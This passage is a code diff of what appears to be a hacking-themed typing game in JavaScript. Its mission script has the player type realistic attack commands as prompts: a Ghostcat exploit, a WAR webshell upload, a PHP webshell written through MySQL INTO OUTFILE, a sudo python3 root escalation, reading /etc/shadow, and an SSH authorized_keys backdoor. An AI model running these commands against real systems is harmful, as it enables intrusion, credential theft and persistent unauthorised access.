-  if(G.scene==='intro' && cmd==='connect --vpn'){
-    enableInput(false);return sceneVPN();
-  }
-  if(G.scene==='ssh' && (cmd==='ssh analyst@10.0.8.52 -p 2222' || cmd==='ssh analyst@10.0.8.52')){
-    enableInput(false);return sceneSSHIn();
-  }
-  if(G.scene==='vault' && (cmd.startsWith('extract'))){
-    enableInput(false);return sceneExtract();
-  }
-  if(G.scene==='exfil' && (cmd.startsWith('wipe'))){
-    enableInput(false);return sceneExfil();
-  }
-
-  // Unknown command
-  tErr('>> Unknown command: '+cmd);
-  const h=document.getElementById('hint-txt');
-  if(h.querySelector('span')){
-    tSys('Try: '+h.querySelector('span').textContent);
-  }
+/* ═══ LAUNCH MISSION ═══ */
+function launch(m){
+  CM=m;unlockedTools=[];targetIntel={};credVault=[];
+  G={id:m.id,stats:{s:80,h:65,op:75,ht:5},ids:5,peak:5,mgt:null,clk:null,wps:null,wpc:0,start:Date.now()};
+  renderTools();renderCreds();document.getElementById('tgtrows').innerHTML='<div style="font-size:8px;color:var(--tx3)">[ no intel gathered ]</div>';
+  document.getElementById('cvepanel').innerHTML='<div style="font-size:8px;color:var(--tx3)">[ no active exploit ]</div>';
+  document.getElementById('crackpanel').classList.remove('show');
+  buildNodes(m.nodes);setStat('s',80);setStat('h',65);setStat('op',75);setStat('ht',5);setIDS(5);
+  setLoc('SECURE CHANNEL');setPh('INIT');
+  document.getElementById('sbop').textContent='// '+m.id.toUpperCase();
+  document.getElementById('tout').innerHTML='';document.getElementById('logpanel').innerHTML='';
+  enableIn(false);showScr('s-game');
+  G.clk=setInterval(()=>{const e=Math.floor((Date.now()-G.start)/1000);document.getElementById('tbtime').textContent=String(Math.floor(e/60)).padStart(2,'0')+':'+String(e%60).padStart(2,'0');},1000);
+  RUNNERS[m.id]();log('Launched: '+m.name,'lok');
 }
 
-/* ── MINI-GAME ── */
-function startMG(cfg){
-  G.mg={active:true,prompts:cfg.prompts,idx:0,start:Date.now(),timer:null,onDone:cfg.onDone,onFail:cfg.onFail,limit:cfg.limit||50};
-  document.getElementById('mg').classList.add('show');
-  document.getElementById('mg-title').textContent=cfg.title||'BREACH SEQUENCE';
-  document.getElementById('mg-inst').textContent=cfg.inst;
+/* ═══ NODES ═══ */
+let _nodes=[];
+function buildNodes(labels){_nodes=labels.map((l,i)=>({label:l,st:i===0?'active':'locked'}));renderN();}
+function renderN(){document.getElementById('mnodes').innerHTML=_nodes.map((n,i)=>`${i>0?'<div class="mc"></div>':''}<div class="mn ${n.st}"><div class="ml ${n.st==='done'?'d':n.st==='active'?'a':''}">${n.label}</div><div class="ms2" style="color:${n.st==='done'?'var(--g2)':n.st==='active'?'var(--am)':'var(--tx3)'}">${n.st==='done'?'✓':n.st==='active'?'▶':'—'}</div></div>`).join('');}
+function nextN(){const ai=_nodes.findIndex(n=>n.st==='active');if(ai>=0)_nodes[ai].st='done';const ni=_nodes.findIndex(n=>n.st==='locked');if(ni>=0)_nodes[ni].st='active';renderN();}
+function allDoneN(){_nodes.forEach(n=>n.st='done');renderN();}
+
+/* ═══ TERMINAL ═══ */
+let tQ=[];let tB=false;
+function tp(text,cls,delay){cls=cls||'t-story';delay=delay||0;tQ.push({text,cls,delay});if(!tB)pQ();}
+function pQ(){if(!tQ.length){tB=false;return;}tB=true;const it=tQ.shift();setTimeout(()=>{const out=document.getElementById('tout');const el=document.createElement('div');el.className='tl '+it.cls;out.appendChild(el);out.scrollTop=out.scrollHeight;if(['t-story','t-npc','t-player'].includes(it.cls)){let i=0;const iv=setInterval(()=>{el.textContent=it.text.slice(0,i+1);i++;out.scrollTop=out.scrollHeight;if(i>=it.text.length){clearInterval(iv);setTimeout(pQ,45);}},11);}else{el.innerHTML=it.text;pQ();}},it.delay);}
+const tSys=t=>tp(t,'t-sys');
+const tOK=t=>tp(t,'t-ok');
+const tErr=t=>tp(t,'t-err');
+const tWarn=t=>tp(t,'t-warn');
+const tInfo=t=>tp(t,'t-info');
+const tNPC=(n,t)=>tp('['+n+'] '+t,'t-npc',25);
+const tHdr=t=>tp(t,'t-hdr');
+const tScan=t=>tp(t,'t-scan');
+const tVuln=t=>tp(t,'t-vuln');
+const tLoot=t=>tp(t,'t-loot');
+const tBlank=()=>tp('','t-sys');
+const tCode=t=>tp(t,'t-code');
+
+/* ═══ LOG ═══ */
+function log(msg,type){type=type||'lm';const now=new Date();const ts=String(now.getHours()).padStart(2,'0')+':'+String(now.getMinutes()).padStart(2,'0')+':'+String(now.getSeconds()).padStart(2,'0');const el=document.createElement('div');el.className='le';el.innerHTML='<span class="lt">['+ts+']</span> <span class="'+type+'">'+msg+'</span>';const lo=document.getElementById('logpanel');lo.appendChild(el);lo.scrollTop=lo.scrollHeight;}
+
+/* ═══ STATS ═══ */
+function setStat(k,v){v=Math.max(0,Math.min(100,v));G.stats[k]=v;const sm={'s':'svs','h':'svh','op':'svop','ht':'svht'};const sm2={'s':'sfs','h':'sfh','op':'sfop','ht':'sfht'};const sv=document.getElementById(sm[k]);const sf=document.getElementById(sm2[k]);if(sv)sv.textContent=v;if(sf)sf.style.width=v+'%';}
+function setIDS(v){v=Math.max(0,Math.min(100,v));G.ids=v;if(v>G.peak)G.peak=v;document.getElementById('idsfill').style.width=v+'%';document.getElementById('idspct').textContent=v+'%';const col=v<40?'var(--g)':v<70?'var(--am)':'var(--rd)';document.getElementById('idsfill').style.background=col;document.getElementById('idspct').style.color=col;const b=document.getElementById('tbbdg');if(v<30){b.textContent='THREAT: LOW';b.className='low';}else if(v<65){b.textContent='THREAT: MED';b.className='med';}else{b.textContent='THREAT: HIGH';b.className='hi';}}
+function setLoc(t){document.getElementById('tbloc').textContent=t;}
+function setPh(t){document.getElementById('tbph').textContent=t;}
+function notify(msg,type){type=type||'info';const el=document.createElement('div');el.className='notif '+type;el.textContent=msg;document.getElementById('notifs').appendChild(el);log(msg,type==='ok'?'lok':type==='bad'||type==='warn'?'lwn':'lm');setTimeout(()=>el.remove(),3200);}
+
+/* ═══ INPUT ═══ */
+const cmdEl=document.getElementById('cmd');
+cmdEl.addEventListener('keydown',e=>{if(e.key!=='Enter')return;e.preventDefault();const val=cmdEl.value.trim().toLowerCase();if(!val)return;tp('> '+val,'t-player');cmdEl.value='';if(!G.wps)G.wps=Date.now();G.wpc+=val.length+1;const mins=(Date.now()-G.wps)/60000;if(mins>.01)document.getElementById('wpmv').textContent=Math.round((G.wpc/5)/mins);let hit=false;for(const k of Object.keys(CBC)){if(val===k||val.startsWith(k.split(' ')[0])){hit=true;CBC[k]();break;}}if(!hit)tErr('>> Unrecognized command. Check the hint.');});
+const onC=(cmd,fn)=>CBC[cmd]=fn;
+const clearC=()=>{CBC={};};
+function enableIn(on,hint,ph){cmdEl.disabled=!on;const h=document.getElementById('hinttxt');if(on){h.innerHTML=hint?'CMD: <span>'+hint+'</span>':'AWAITING INPUT';cmdEl.placeholder=ph||hint||'type a command...';setTimeout(()=>cmdEl.focus(),80);}else{h.textContent='SELECT AN OPTION';cmdEl.placeholder='...';}}
+function showCh(arr){const el=document.getElementById('choices');el.innerHTML='';arr.forEach(c=>{const btn=document.createElement('button');btn.className='ch';btn.textContent=c.label;btn.onclick=()=>{el.classList.remove('show');el.innerHTML='';tp('> '+c.label,'t-player');enableIn(false);clearC();c.go();};el.appendChild(btn);});el.classList.add('show');}
+function hideCh(){const el=document.getElementById('choices');el.classList.remove('show');el.innerHTML='';}
+
+/* ═══ MINI-GAME ENGINE ═══ */
+function startMG(cfg){G.mgCfg=cfg;_runMG(cfg);}
+function _runMG(cfg){
+  G.mg={active:true,prompts:cfg.prompts,idx:0,start:Date.now()};
+  const ov=document.getElementById('mg');ov.classList.add('show');
+  document.getElementById('mgtitle').textContent=cfg.title||'EXPLOIT';
+  document.getElementById('mgph').textContent=cfg.phase||'EXECUTE';
+  const ctxEl=document.getElementById('mgctx');ctxEl.textContent=cfg.ctx||'';ctxEl.style.display=cfg.ctx?'block':'none';
+  document.getElementById('mginst').textContent=cfg.inst;
+  document.getElementById('mgfail').classList.remove('show');
+  document.getElementById('mginput').style.display='block';
+  document.getElementById('mgmeta').style.display='flex';
+  document.getElementById('mgsteps').textContent='1/'+cfg.prompts.length;
+  const inp=document.getElementById('mginput');inp.value='';inp.className='';inp.disabled=false;inp.oninput=handleMGI;
+  setTimeout(()=>inp.focus(),80);
+  let rem=cfg.limit||50;document.getElementById('mgtimer').textContent=rem+'s';
+  clearInterval(G.mgt);
+  G.mgt=setInterval(()=>{rem--;document.getElementById('mgtimer').textContent=rem+'s';
+    if(rem<=10)document.getElementById('mgtimer').style.color='var(--rd)';
+    else document.getElementById('mgtimer').style.color='var(--am)';
+    if(rem<=0){clearInterval(G.mgt);burnMission(cfg.failMsg||'Timer expired — IDS flagged the intrusion.');}
+  },1000);
   loadMGP();
-  const inp=document.getElementById('mg-input');
-  inp.value='';inp.className='';
-  inp.oninput=handleMGI;
-  setTimeout(()=>inp.focus(),100);
-  let rem=G.mg.limit;
-  document.getElementById('mg-timer').textContent=rem+'s';
-  G.mg.timer=setInterval(()=>{rem--;document.getElementById('mg-timer').textContent=rem+'s';if(rem<=0){clearInterval(G.mg.timer);endMG(false);}},1000);
 }
-function loadMGP(){
-  renderMGP('');
-  document.getElementById('mg-input').value='';
-  document.getElementById('mg-input').className='';
-  document.getElementById('mg-pfill').style.width=(G.mg.idx/G.mg.prompts.length*100)+'%';
-}
-function renderMGP(typed){
-  const target=G.mg.prompts[G.mg.idx];
-  let h='';
-  for(let i=0;i<target.length;i++){
-    const ch=target[i]===' '?'&nbsp;':target[i];
-    if(i<typed.length){
-      h+='<span style="color:'+(typed[i]===target[i]?'var(--green)':'var(--red)')+'">'+ch+'</span>';
-    } else {
-      if(i===typed.length)h+='<span style="background:var(--green);color:var(--bg);padding:0 1px;">&nbsp;</span>';
-      h+='<span style="color:var(--text3)">'+ch+'</span>';
-    }
-  }
-  document.getElementById('mg-prompt').innerHTML=h;
-}
+function loadMGP(){renderMGP('');const inp=document.getElementById('mginput');inp.value='';inp.className='';document.getElementById('mgpfill').style.width=(G.mg.idx/G.mg.prompts.length*100)+'%';document.getElementById('mgsteps').textContent=(G.mg.idx+1)+'/'+G.mg.prompts.length;}
+const escH=c=>c==='<'?'&lt;':c==='>'?'&gt;':c==='&'?'&amp;':c;
+function renderMGP(typed){const target=G.mg.prompts[G.mg.idx];let h='';for(let i=0;i<target.length;i++){const ch=target[i]===' '?'&nbsp;':escH(target[i]);if(i<typed.length){h+=typed[i]===target[i]?'<span class="co">'+ch+'</span>':'<span class="cb">'+ch+'</span>';}else if(i===typed.length){h+='<span class="cn">'+ch+'</span>';}else{h+='<span class="cp">'+ch+'</span>';}}document.getElementById('mgprompt').innerHTML=h;}
 function handleMGI(){
-  if(!G.mg.active)return;
-  const inp=document.getElementById('mg-input');
-  const typed=inp.value;
-  const target=G.mg.prompts[G.mg.idx];
+  if(!G.mg||!G.mg.active)return;
+  const inp=document.getElementById('mginput');const typed=inp.value;const target=G.mg.prompts[G.mg.idx];
   renderMGP(typed);
   const mins=(Date.now()-G.mg.start)/60000;
-  if(mins>0.01){
-    const tot=G.mg.prompts.slice(0,G.mg.idx).join('').length+typed.length;
-    document.getElementById('mg-wpm-txt').textContent='WPM: '+Math.round((tot/5)/mins);
-  }
-  let err=false;
-  for(let i=0;i<typed.length;i++){if(typed[i]!==target[i]){err=true;break;}}
+  if(mins>.01){const tot=G.mg.prompts.slice(0,G.mg.idx).join('').length+typed.length;document.getElementById('mgwpm').textContent='WPM: '+Math.round((tot/5)/mins);}
+  let err=false;for(let i=0;i<typed.length&&i<target.length;i++)if(typed[i]!==target[i]){err=true;break;}
   inp.className=err?'err':'';
   if(typed===target){
     G.mg.idx++;inp.className='ok2';
-    if(G.mg.idx>=G.mg.prompts.length){setTimeout(()=>endMG(true),280);}
-    else{setTimeout(()=>{inp.value='';inp.className='';loadMGP();},180);}
+    if(G.mg.idx>=G.mg.prompts.length){clearInterval(G.mgt);setTimeout(()=>endMG(true),270);}
+    else{setTimeout(()=>{inp.value='';inp.className='';loadMGP();},160);}
   }
 }
-function endMG(ok){
-  clearInterval(G.mg.timer);G.mg.active=false;
-  document.getElementById('mg').classList.remove('show');
-  if(ok&&G.mg.onDone)G.mg.onDone();
-  else if(!ok&&G.mg.onFail)G.mg.onFail();
+function endMG(ok){clearInterval(G.mgt);G.mg.active=false;document.getElementById('mg').classList.remove('show');if(ok&&G.mgCfg.onDone)G.mgCfg.onDone();}
+function burnMission(reason){clearInterval(G.mgt);if(G.mg)G.mg.active=false;const inp=document.getElementById('mginput');inp.disabled=true;inp.style.display='none';document.getElementById('mgmeta').style.display='none';document.getElementById('mgfailmsg').textContent=reason;document.getElementById('mgfail').classList.add('show');document.getElementById('retrybtn').onclick=()=>{inp.disabled=false;_runMG(G.mgCfg);};log('BURNED: '+reason,'ler');notify('MISSION BURNED','bad');}
+
+/* ═══ MISSION COMPLETE ═══ */
+function missionComplete(msg){
+  progress[CM.id]='done';saveP();allDoneN();clearInterval(crackTimer);
+  const mins=G.wps?(Date.now()-G.wps)/60000:0;const wpm=mins>.01?Math.round((G.wpc/5)/mins):0;
+  setTimeout(()=>{document.getElementById('endmsg').textContent=msg;document.getElementById('ewpm').textContent=wpm||'—';document.getElementById('eids').textContent=G.peak+'%';document.getElementById('est').textContent=G.stats.s;document.getElementById('eop').textContent=G.stats.op;showScr('s-end');},2400);
 }
+function showScr(id){document.querySelectorAll('.screen').forEach(s=>s.classList.add('hide'));document.getElementById(id).classList.remove('hide');}
 
-/* ══════════════════════════════════════
-   SCENES
-══════════════════════════════════════ */
+/* ═══════════════════════════════════════════
+   MISSION 1: BLACKVAULT (RECRUIT)
+   Full 8-phase kill chain — longest & most tutorial-friendly
+   Real CVEs: CVE-2020-1938 Ghostcat, MySQL INTO OUTFILE
+   New: Shodan/crt.sh output, nmap output simulation,
+        sudo -l output, ssh-keygen backdoor, Chisel pivot,
+        MSSQL dump, HTTPS exfil, wevtutil cleanup
+═══════════════════════════════════════════ */
+const RUNNERS={};
 
-function sceneIntro(){
-  G.scene='intro';setLoc('SECURE CHANNEL');
-  tHdr('// OP: BLACKVAULT — BRIEFING');
-  tSys('AES-256 ✓  |  Anonymizer: 4-hop ✓  |  Trace: Clean ✓');tBlank();
-  tNPC('HANDLER','Target: NovaCorp BLACKVAULT server. Financial ledger, 2.3GB encrypted. Board-level fraud. $400M.');
-  tNPC('HANDLER','Asset left a port open. Three security layers between you and it. Get in, get out.');tBlank();
+RUNNERS.nvc=function(){
+  setLoc('OSINT PHASE');setPh('RECON');
+  tHdr('// OP: BLACKVAULT — PHASE 1: PASSIVE RECON & OSINT');
+  tSys('Target: NovaCorp Inc. | novacorp.io | San Francisco CA');
+  tSys('Passive only. No packets to target. Fingerprint from public sources.');tBlank();
   setTimeout(()=>{
-    enableInput(true,'connect --vpn');
-    cmdInput.placeholder='connect --vpn';
+    tInfo('[ crt.sh certificate transparency ]');
+    tScan('  *.novacorp.io → mail.novacorp.io, vpn.novacorp.io, dev.novacorp.io, stage.novacorp.io');tBlank();
+    tInfo('[ shodan.io query: org:"NovaCorp Inc" ]');
+    tScan('  85.214.22.11:80   Apache 2.4.41 (Ubuntu)');
+    tScan('  85.214.22.11:8080 Apache Tomcat/9.0.31');
+    tScan('  85.214.22.11:3306 MySQL 5.7.32');tBlank();
+    tInfo('[ github.com/novacorp-devops — dorking .env files ]');
+    tVuln('  LEAKED: .env committed 6d ago (since deleted, still in git history)');
+    tVuln('  DB_HOST=85.214.22.11 | DB_PASSWORD=NovaCorp2024! | SMTP=admin@novacorp.io');tBlank();
+    tInfo('[ linkedin + hunter.io employee enumeration ]');
+    tScan('  IT: james.webb@novacorp.io · sarah.chen@novacorp.io · k.patel@novacorp.io');tBlank();
+    tLoot('  >> ATTACK SURFACE: Tomcat 8080 + MySQL 3306 externally exposed');
+    tLoot('  >> CREDENTIALS: DB_PASSWORD=NovaCorp2024! (leaked .env)');
+    setIntel('IP','85.214.22.11','f');setIntel('Tomcat','9.0.31 on 8080','f');setIntel('.env Leak','DB+SMTP creds','v');setIntel('Subdomains','4 found','f');
+    unlockTool('nmap');
+    setTimeout(()=>{tBlank();tNPC('HANDLER','OSINT complete. Time to go active. Port scan the target.');tBlank();
+      enableIn(true,'nmap -sV -sC -T4 --open 85.214.22.11');clearC();onC('nmap',nvc_scan);
+    },900);
   },1800);
-  log('Briefing received','log-ok');
-}
+};
 
-function sceneVPN(){
-  setLoc('NOVACORE DMZ');
-  tBlank();tOK('>> VPN ESTABLISHED — Tokyo → Frankfurt → São Paulo → Target');
-  tSys('IP masked. Inside DMZ. Three entry vectors detected.');tBlank();
-  tNPC('HANDLER','FTP backdoor, SSH with cracked creds, or social-engineer the helpdesk. Your call.');tBlank();
-  setStat('s',90);setIDS(12);notify('VPN active','ok');log('DMZ accessed','log-ok');
-  activateNode('breach');
+function nvc_scan(){
+  enableIn(false);clearC();nextN();setLoc('PORT SCAN');setPh('ENUMERATION');
+  tBlank();tHdr('// PHASE 2: ACTIVE PORT SCAN & SERVICE ENUMERATION');
+  tSys('$ nmap -sV -sC -T4 --open 85.214.22.11');tBlank();
   setTimeout(()=>{
-    showChoices([
-      {label:'[1] EXPLOIT FTP BACKDOOR',go:sceneFTP},
-      {label:'[2] SSH WITH CRACKED CREDS',go:sceneSSH},
-      {label:'[3] SOCIAL ENGINEER HELPDESK',go:sceneSocial},
-    ]);
-    enableInput(false);
-  },1000);
+    tScan('Starting Nmap 7.94 ( https://nmap.org )');
+    tScan('Nmap scan report for novacorp.io (85.214.22.11)');tScan('Host is up (0.042s latency).');tBlank();
+    tScan('PORT     STATE SERVICE   VERSION');
+    tScan('22/tcp   open  ssh       OpenSSH 7.9p1 Ubuntu 4ubuntu0.6');
+    tScan('80/tcp   open  http      Apache httpd 2.4.41');
+    tScan('443/tcp  open  https     Apache httpd 2.4.41');
+    tScan('8080/tcp open  http      Apache Tomcat 9.0.31');
+    tScan('8009/tcp open  ajp13     Apache Jserv Protocol v1.3');
+    tVuln('   >>> AJP connector exposed on 8009 — CVE-2020-1938 GHOSTCAT CRITICAL');
+    tScan('3306/tcp open  mysql     MySQL 5.7.32-0ubuntu0.18.04.1');
+    tVuln('   >>> MySQL externally accessible — try leaked credentials');
+    tScan('5432/tcp open  postgresql PostgreSQL DB 12.4');tBlank();
+    tScan('SCRIPT OUTPUT:');
+    tScan('  http-title: NovaCorp - Employee Portal');
+    tScan('  ssl-cert: Subject: commonName=novacorp.io');
+    tScan('  mysql-info: Protocol: 10, Version: 5.7.32');
+    setIntel('AJP 8009','CVE-2020-1938','v');setIntel('MySQL 3306','external access','v');
+    showCVE('CVE-2020-1938');unlockTool('burp');unlockTool('msf');
+    setTimeout(()=>{tBlank();tNPC('HANDLER','Ghostcat on port 8009 or MySQL with the leaked password. Ghostcat needs zero creds.');tBlank();
+      showCh([{label:'[A] GHOSTCAT CVE-2020-1938 — zero creds, AJP exploit',go:nvc_ghostcat},{label:'[B] MYSQL INTO OUTFILE — use leaked .env password',go:nvc_mysql}]);
+    },700);
+  },2200);
 }
 
-function sceneFTP(){
-  setLoc('FTP SERVICE — PORT 21');
-  tBlank();tHdr('// EXPLOIT: vsftpd 2.3.4');
-  tNPC('HANDLER','Unpatched since 2011. Classic negligence. Type the sequence.');tBlank();
-  startMG({
-    title:'// FTP BACKDOOR',
-    inst:'Type each command exactly as shown, then press Enter or wait for auto-advance.',
-    prompts:['nmap -sV -p 21 192.168.10.5','ftp 192.168.10.5 6200','USER :)','PASS anonymous'],
-    limit:60,
-    onDone:()=>{tBlank();tOK('>> FTP SHELL OPEN.');setIDS(26);setStat('h',82);notify('FTP exploit: clean','ok');log('vsftpd backdoor','log-ok');activateNode('vault');setTimeout(sceneFirewall,700);},
-    onFail:()=>{tBlank();tErr('>> DETECTED. IDS flagged.');setIDS(46);setStat('s',62);notify('IDS alert!','bad');setTimeout(sceneFirewall,600);}
-  });
+function nvc_ghostcat(){
+  setLoc('EXPLOIT — CVE-2020-1938');setPh('EXPLOIT');showCVE('CVE-2020-1938');
+  tBlank();tHdr('// PHASE 3A: GHOSTCAT (CVE-2020-1938) — AJP FILE INCLUSION');
+  tInfo('Apache Tomcat AJP connector on port 8009 — no authentication required.');
+  tInfo('Step 1: Read WEB-INF/web.xml to extract Tomcat manager credentials.');
+  tInfo('Step 2: Upload a malicious WAR file via the manager app to get RCE.');tBlank();
+  startMG({title:'// CVE-2020-1938 GHOSTCAT',phase:'EXPLOIT',
+    ctx:'Apache Tomcat 9.0.31 — the AJP connector on port 8009 allows unauthenticated file read from the webapp root. WEB-INF/web.xml leaks manager credentials. We use them to deploy a WAR webshell.',
+    inst:'Exploit Ghostcat: read web.xml, authenticate to Tomcat manager, deploy WAR webshell.',
+    prompts:['python3 ghostcat.py -u 85.214.22.11 -p 8009','python3 ghostcat.py -u 85.214.22.11 -p 8009 -f /WEB-INF/web.xml','curl -u tomcat:NovaCorp2024! http://85.214.22.11:8080/manager/html','curl -u tomcat:NovaCorp2024! -T shell.war "http://85.214.22.11:8080/manager/deploy?path=/sh"','curl "http://85.214.22.11:8080/sh/cmd?c=id"'],
+    limit:65,failMsg:'Ghostcat exploit timed out — Tomcat session expired.',
+    onDone:()=>{
+      tBlank();tOK('>> WAR WEBSHELL DEPLOYED. RCE CONFIRMED.');
+      tLoot('  uid=33(www-data) gid=33(www-data) groups=33(www-data)');
+      addCred('TOMCAT','tomcat:NovaCorp2024!');
+      setIntel('Shell','www-data RCE','f');setIDS(22);setStat('h',78);
+      notify('Ghostcat: RCE via WAR webshell','ok');nextN();setTimeout(nvc_privesc,800);
+    }});
 }
 
-function sceneSSH(){
-  setLoc('SSH ENDPOINT — PORT 2222');
-  tBlank();tHdr('// SSH CREDENTIAL ATTACK');
-  tNPC('HANDLER','Hash cracked. analyst / Str0ng!Pass2024. Unrotated for 14 months.');tBlank();
-  tSys('Connect to the endpoint — type the command and press Enter:');tBlank();
-  G.scene='ssh';setStat('o',70);log('SSH creds ready','log-ok');
+function nvc_mysql(){
+  setLoc('EXPLOIT — MYSQL OUTFILE');setPh('EXPLOIT');
+  tBlank();tHdr('// PHASE 3B: MYSQL EXTERNAL ACCESS + INTO OUTFILE');
+  tInfo('MySQL 5.7.32 accessible externally on port 3306. Leaked root password: NovaCorp2024!');
+  tInfo('SELECT INTO OUTFILE writes arbitrary files to disk — including a PHP webshell.');tBlank();
+  startMG({title:'// MYSQL WEBSHELL',phase:'EXPLOIT',
+    ctx:'MySQL root is accessible externally with the .env leaked password — a critical misconfiguration. SELECT INTO OUTFILE writes a PHP one-liner to /var/www/html. No CVE needed, just misconfiguration abuse.',
+    inst:'Log into MySQL, enumerate databases, write a PHP webshell via INTO OUTFILE.',
+    prompts:['mysql -h 85.214.22.11 -u root -pNovaCorp2024! -e "show databases;"','mysql -h 85.214.22.11 -u root -pNovaCorp2024! -e "select user,authentication_string from mysql.user;"','mysql -h 85.214.22.11 -u root -pNovaCorp2024! novacorp_db -e "show tables;"','mysql -h 85.214.22.11 -u root -pNovaCorp2024! -e "SELECT \'<?php system($_GET[c]); ?>\' INTO OUTFILE \'/var/www/html/x.php\';"','curl "http://85.214.22.11/x.php?c=id"'],
+    limit:60,failMsg:'MySQL refused connection or file write failed.',
+    onDone:()=>{
+      tBlank();tOK('>> PHP WEBSHELL AT /x.php — RCE CONFIRMED.');
+      tLoot('  uid=33(www-data) gid=33(www-data)');
+      addCred('MYSQL ROOT','root:NovaCorp2024!');
+      setIntel('Shell','www-data via MySQL','f');setIDS(18);setStat('h',74);
+      notify('MySQL: webshell written via INTO OUTFILE','ok');nextN();setTimeout(nvc_privesc,800);
+    }});
+}
+
+function nvc_privesc(){
+  setLoc('PRIVILEGE ESCALATION');setPh('PRIVESC');
+  tBlank();tHdr('// PHASE 4: LINUX PRIVILEGE ESCALATION');
+  tInfo('Current context: www-data (uid 33). Target: root (uid 0).');
+  tSys('Uploading LinPEAS and running enumeration...');tBlank();
   setTimeout(()=>{
-    enableInput(true,'ssh analyst@10.0.8.52 -p 2222');
-    cmdInput.placeholder='ssh analyst@10.0.8.52 -p 2222';
-  },1200);
+    tScan('╔══════════╣ Sudo version');tScan('Sudo version 1.8.21p2');tBlank();
+    tScan('╔══════════╣ SUID files');tScan('/usr/bin/find /usr/bin/python3 /usr/bin/pkexec');tBlank();
+    tScan('╔══════════╣ Sudo commands');tVuln('Matching Defaults entries for www-data on novacorp:');tVuln('  (ALL) NOPASSWD: /usr/bin/python3');tBlank();
+    tVuln('>>> www-data can run python3 as root with NO PASSWORD');tVuln('>>> GTFOBins: sudo python3 -c "import os; os.system(\'/bin/bash\')"');tBlank();
+    tScan('╔══════════╣ Interesting files in /home');tScan('/home/jameswebb/.ssh/id_rsa — READABLE');
+    tLoot('  >> PRIVESC VECTOR: sudo python3 NOPASSWD → instant root');
+    unlockTool('chisel');
+    startMG({title:'// SUDO PRIVILEGE ESCALATION',phase:'PRIVESC',
+      ctx:'www-data has passwordless sudo on python3. GTFOBins documents this exact vector: os.system() spawns a shell inheriting the sudo context. We also grab /etc/shadow and root\'s SSH key for lateral movement.',
+      inst:'Escalate to root via sudo python3 (GTFOBins). Extract /etc/shadow and root SSH key.',
+      prompts:['sudo -l','sudo python3 -c "import os; os.system(\'/bin/bash\')"','id && cat /etc/os-release | head -3','cat /etc/shadow | head -8','ssh-keygen -t rsa -b 4096 -f /root/.ssh/ghost_key -N ""','cat /root/.ssh/ghost_key >> /tmp/exfil_keys.txt'],
+      limit:60,failMsg:'sudo python3 failed — check PATH or shell restrictions.',
+      onDone:()=>{
+        tBlank();tOK('>> ROOT SHELL. uid=0(root).');
+        tLoot('  /etc/shadow extracted — 12 user hashes');
+        tLoot('  /root/.ssh/id_rsa — root RSA private key');
+        addCred('ROOT HASH','root:$6$salt$hash...');
+        setIntel('Access','ROOT shell','f');setIDS(30);setStat('h',88);setStat('s',75);
+        notify('PrivEsc: root via sudo python3','ok');unlockTool('john');nextN();setTimeout(nvc_persist,900);
+      }});
+  },2000);
 }
 
-function sceneSSHIn(){
-  setLoc('SSH — ANALYST SESSION');
-  tBlank();tOK('>> CONNECTED. Welcome, analyst.');
-  tSys('Internal subnet mapped. BLACKVAULT MAC located.');
-  setIDS(19);setStat('h',78);notify('SSH in as analyst','ok');log('SSH session open','log-ok');
-  activateNode('vault');setTimeout(sceneFirewall,800);
+function nvc_persist(){
+  setLoc('PERSISTENCE');setPh('PERSIST');
+  tBlank();tHdr('// PHASE 5: ESTABLISHING PERSISTENCE');
+  tNPC('HANDLER','Root is volatile. We need guaranteed re-entry. Multiple persistence mechanisms for redundancy.');tBlank();
+  tInfo('SSH backdoor: silent, uses existing service, hard to detect');
+  tInfo('Cron revshell: fires every minute, survives reboots, noisy in cron logs');tBlank();
+  showCh([{label:'[A] SSH BACKDOOR — inject RSA public key',go:nvc_persist_ssh},{label:'[B] CRON REVERSE SHELL — auto-callback every 60s',go:nvc_persist_cron}]);
 }
 
-function sceneSocial(){
-  setLoc('NOVACORE IT HELPDESK');
-  tBlank();tHdr('// SOCIAL ENGINEERING');
-  tNPC('HANDLER','Target: Daniel Marsh, Senior Infra. Outsourced helpdesk. Overworked. Go.');tBlank();
-  tNPC('HELPDESK','NovaCorp IT, this is Kevin.');
-  tNPC('YOU','Daniel Marsh — locked out, emergency maintenance window. Need a reset now.');
-  tNPC('HELPDESK','Employee ID?');
-  tNPC('YOU','N-7741. VP Engineering is watching this deployment.');
-  tNPC('HELPDESK','Reset pushed. OTP to registered device.');
-  tNPC('HANDLER','SIM intercept live. Got it.');tBlank();
-  tOK('>> CREDENTIALS OBTAINED.');
-  setStat('o',88);setIDS(15);notify('Social eng: success','ok');log('Helpdesk creds obtained','log-ok');
-  activateNode('vault');setTimeout(sceneFirewall,1400);
+function nvc_persist_ssh(){
+  tBlank();tHdr('// SSH BACKDOOR — AUTHORIZED_KEYS INJECTION');
+  tInfo('Plant our RSA public key in /root/.ssh/authorized_keys.');
+  tInfo('Enable PermitRootLogin. Completely silent post-install.');tBlank();
+  startMG({title:'// SSH BACKDOOR',phase:'PERSIST',
+    ctx:'SSH key auth leaves no password in logs. Once our pubkey is in authorized_keys and PermitRootLogin is yes, we reconnect as root silently at any time. The hardest part for defenders is finding the injected key.',
+    inst:'Plant the SSH backdoor. Inject public key, enable root login, verify.',
+    prompts:['mkdir -p /root/.ssh && chmod 700 /root/.ssh','echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC... ghost@c2" >> /root/.ssh/authorized_keys','chmod 600 /root/.ssh/authorized_keys','sed -i "s/^#PermitRootLogin.*/PermitRootLogin yes/" /etc/ssh/sshd_config','systemctl reload ssh && ssh -i ~/.ssh/ghost_key root@85.214.22.11 -o StrictHostKeyChecking=no "id"'],
+    limit:55,failMsg:'SSH config reload failed — sshd_config syntax error.',
+    onDone:()=>{
+      tBlank();tOK('>> SSH BACKDOOR ACTIVE. Root access confirmed from C2.');
+      setIntel('Persist','SSH authorized_keys','f');setIDS(33);notify('SSH backdoor: planted','ok');nextN();setTimeout(nvc_lateral,900);
+    }});
 }
 
-function sceneFirewall(){
-  setLoc('BLACKVAULT PERIMETER');
-  tBlank();tHdr('// CUSTOM FIREWALL — LAYER 2');
-  tNPC('HANDLER','Stateful DPI. Custom-built. Stealth packet = surgical, low noise. Brute-force = fast, loud.');tBlank();
+function nvc_persist_cron(){
+  tBlank();tHdr('// CRON PERSISTENCE — REVERSE SHELL CALLBACK');
+  startMG({title:'// CRON REVSHELL',phase:'PERSIST',
